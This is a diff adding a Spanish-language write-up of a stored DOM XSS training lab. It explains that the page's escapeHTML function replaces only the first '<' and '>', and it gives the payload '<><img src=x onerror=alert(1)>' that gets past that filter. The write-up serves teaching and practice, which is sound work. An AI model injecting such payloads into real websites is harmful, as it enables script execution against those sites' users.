@@ -763,5 +763,56 @@ R:
 
 ## 27. Lab: Stored DOM XSS
 
+```
+This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function.
+```
+
+Enviamos un comentario y luego actualizamos la pagina. Vamos a la seccion del Burp Proxy, en el historial, vemos un request para cargar los comentario.
+
+![](img60.png)
+
+Entonces, lo que intentaremos será escapar de todo ello como en el ejemplo anterior.
+
+```
+\"-alert(1)}//
+```
+
+Pero, como podemos ver, no funciona nuestro payload.
+
+![](img61.png)
+
+Entonces, revisaremos un poco el codigo de **<script src='resources/js/loadCommentsWithVulnerableEscapeHtml.js'></script>**
+
+Como podemos ver en esta muestra:
+
+```javascript
+> let s="holaaaaaaaaaaa"
+< undefined
+> s
+< "holaaaaaaaaaaa"
+> s.replace('a', 'o')
+< "holoaaaaaaaaaa"
+```
+
+El metodo **replace** solo remplaza la primera coincidencia, no las demás, entonces analizando el codigo del JS, encontramos la funcion siguiente:
+
+```javascript
+    function escapeHTML(html) {
+        return html.replace('<', '&lt;').replace('>', '&gt;');
+    }
+```
+
+Entonces debemos suponer que solo reemplazará los primeros **< >**. Entonces nuestro payload para el comentario seria el siguiente:
+
+```
+<><img src=x onerror=alert(1)>
+```
+
+![](img62.png)
+
+## 28. Lab: Reflected XSS protected by CSP, with dangling markup attack
+
+
+
 
 
